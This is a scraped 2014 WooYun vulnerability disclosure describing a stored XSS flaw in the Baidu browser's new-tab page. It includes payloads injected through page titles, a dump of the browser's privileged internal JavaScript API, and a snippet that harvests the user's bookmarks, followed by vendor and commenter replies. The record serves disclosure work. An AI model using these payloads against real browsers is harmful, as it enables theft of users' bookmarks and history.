{"id": 2638, "wybug_id": "wooyun-2014-064620", "wybug_title": "百度浏览器xss致自身可被劫持", "wybug_corp": "百度", "wybug_author": "random_", "wybug_date": "2014-06-12 16:06", "wybug_open_date": "2014-07-27 16:08", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向公众公开  简要描述： 百度浏览器xss致自身可被劫持 详细说明：  1、漏洞原因问题出在bdbrowser://tabpage/，【手动编辑】时，【最常访问】哪儿会出现访问的top8。结果网页的title没有编码直接写入导致xss。如图：\n\n2、漏洞复现比方说百度搜索，http://www.baidu.com/s?word=<img%20src=x%20onerror=alert(/i@tmxk.org/)>然后新建空白页，手工编辑时\n\n然后就是管理员的神回复，谁好端端的去搜xss代码，我说点击别人发的的连接，百度的谁怀疑呢，还觉得你x的是百度首页。。好吧，继续复现。既然是title，我构造一个友好的页面。页面title为<img src=x onerror=alert(/i@tmxk.org/)>我先打开http://tmxk.org/team，然后手动编辑，如下效果\n\n你再给我唧唧歪歪。   漏洞证明：  3、漏洞利用我tm就想找个接口弹个calc，找了一个小时没找到，但是获取一下用户的cookie、浏览历史、收藏夹总可以吧。分析bdbrowser://tabpage/源码，在bdbrowser://tabpage/tabpage.js发现接口:\nBackbone.sync = function(method, model, options) {        switch (options.type) {            case \"tab\":                tabExcuteData(method, model, options);                break;            case \"bookMark\":                bookMarkExcuteData(method, model, options);                break;            case \"close\":                closeExcuteData(method, model, options);                break;            case \"customNews\":                customNewsExcuteData(method, model, options);                break;            case \"customVideo\":                customVideoExcuteData(method, model, options);                break;            case \"customGame\":                customGameExcuteData(method, model, options);                break;            case \"customSmile\":                customSmileExcuteData(method, model, options);                break;            case \"customMm\":                customMmExcuteData(method, model, options);                break;        }    };\n找参数，最后发现命令池：\nvar cmdPool = {\t\t//http://fe.baidu.com/doc/a/boss/api/tabpage.text\t\t\"bdbrowser.tabpage.getFavorites\": function(_cmd, params, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, params);\t\t},\t\t\"bdbrowser.tabpage.getDefinedFavorites\": function(_cmd, params, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, params);\t\t},\t\t\t/*tabpage鏈€闀胯闂�*/\t\t\"bdbrowser.tabpage.getTopHistory\": function(_cmd, params, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, params);\t\t},\t\t\"bdbrowser.tabpage.removeFavorite\": function(_cmd, id, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, id);\t\t},\t\t\"bdbrowser.tabpage.removeDefined\": function(_cmd, id, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, id);\t\t},\t\t\"bdbrowser.tabpage.openPage\": function(_cmd, info, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, info);\t\t},\t\t\"bdbrowser.tabpage.restoreFavorite\": function(_cmd, info, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, info);\t\t},\t\t\"bdbrowser.tabpage.restoreDefined\": function(_cmd, info, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, info);\t\t},\t\t\"bdbrowser.tabpage.enableMyFavorite\": function(_cmd, enable, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, enable);\t\t},\t\t\"bdbrowser.tabpage.saveFavoritesOrder\": function(_cmd, list, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, list);\t\t},\t\t\"bdbrowser.tabpage.saveDefinedOrder\": function(_cmd, list, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, list);\t\t},\t\t\"bdbrowser.tabpage.getInitData\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, {});\t\t},\t\t\t\t\"bdbrowser.tabpage.updateDefinedSite\": function(_cmd, params, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, params);\t\t},\t\t\"bdbrowser.tabpage.updateFavoriteSite\": function(_cmd, params, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, params);\t\t},\t\t\"bdbrowser.tabpage.onFavoriteRemoved.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.tabpage.onDefinedRemoved.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.tabpage.onDefinedOrderChanged.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.tabpage.onFavoriteOrderChanged.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.tabpage.onFavoriteUpdated.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.tabpage.onDefinedUpdated.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.tabpage.onOpenTypeChanged.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\t\t\"bdbrowser.tabpage.onPageMassage.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.global.openPage\": function(_cmd, details, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, details);\t\t},\t\t\"bdbrowser.global.setValue\": function(_cmd, details, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, details);\t\t},\t\t\"bdbrowser.global.getValue\": function(_cmd, details, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.item);\t\t\t}, details);\t\t},\t\t\"bdbrowser.global.onBroadcast.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.broadcastMsg);\t\t\t}, {});\t\t},\t\t\"bdbrowser.global.broadcast\": function(_cmd, items, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.broadcastMsg);\t\t\t}, items);\t\t},\t\t\"bdbrowser.global.getTN\": function(_cmd, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.tn);\t\t\t}, {});\t\t},\t\t\"bdbrowser.application.getSyncInfo\": function(_cmd, details, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.item);\t\t\t}, details);\t\t},\t\t\"bdbrowser.application.onSync.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.item);\t\t\t}, {});\t\t},\t\t\"bdbrowser.application.onFlushApp.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.item);\t\t\t}, {});\t\t},\t\t\"bdbrowser.extension.notify\": function(_cmd, details, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(){\t\t\t\tcallback();\t\t\t}, details);\t\t},\t\t\"bdbrowser.extension.onNotify.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.extension.onSpecialNotify.addListener\": function(_cmd, details, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, details);\t\t},\t\t\"bdbrowser.bookmarks.getTree\": function(_cmd, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.bookmarks.getChildren\": function(_cmd, details, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, details);\t\t},\t\t\"bdbrowser.xhr.send\": function(_cmd, details, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, details);\t\t},\t\t\"bdbrowser.tabpage.removeFavorite\": function(_cmd, id, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback && callback(content);\t\t\t}, id);\t\t},\t\t\"bdbrowser.global.report\": function(_cmd, details, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, details);\t\t},\t\t\"bdbrowser.history.getRecentClosed\": function(_cmd, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.history.updateRecentClosed.addListener\": function(_cmd, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.history.deleteAllClosed.addListener\": function(_cmd, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.bookmarks.onChanged.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.item.id, content.item);\t\t\t}, {});\t\t},\t\t\"bdbrowser.bookmarks.onCreated.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.item);\t\t\t}, {});\t\t},\t\t\"bdbrowser.bookmarks.onRemoved.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t},\t\t\"bdbrowser.bookmarks.onMoved.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content.item);\t\t\t}, {});\t\t},\t\t\t\t\"bdbrowser.bookmarks.onSorted.addListener\": function(_cmd, callback){\t\t\tdoRequest(_cmd, function(content){\t\t\t\t//callback(content.item.id, content.item);\t\t\t\tcallback();\t\t\t}, {});\t\t},\t\t\"bdbrowser.tabpage.getBrowserBgInfo\": function(_cmd, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t}}\t\t\"bdbrowser.tabpage.onBrowserBgChanged.addListener\": function(_cmd, callback){\t\t\tcallback = callback || emptyFunction;\t\t\tdoRequest(_cmd, function(content){\t\t\t\tcallback(content);\t\t\t}, {});\t\t}\n我随便用两个。获取用户收藏夹：\ns=[],s1=[];bdbrowser.bookmarks.getTree(function(result) {                      result.itemList.forEach(function(item,index){for (a in item) s.push(a);s1.push(item.url)});alert(s1)                        });\n数组s获得所有item参数，数组s1获得用户所有收藏网址。item：\nid,title,url,note,parentId,type,accesstime,icon,children\n收藏网址：\n\n4、最终利用页面：http://tmxk.org/b.html效果：\n\n5、一个滑稽的事情是，清除历史记录的时候代码还执行？\n\n当然常驻内存也不定用这个，上面的接口比较多，发挥自由哦。   修复方案：  尊重别人的劳动就是尊重自己的产品。   版权声明：转载请注明来源 random_@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-13 15:26 厂商回复： 感谢对百度安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-12 16:33 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  又见大牛    \n     2014-06-13 16:36 |    \t\t小怿 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | )\t\t \n  看到你的标题，我果断的也来灵感了，谢谢大牛的标题指点！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}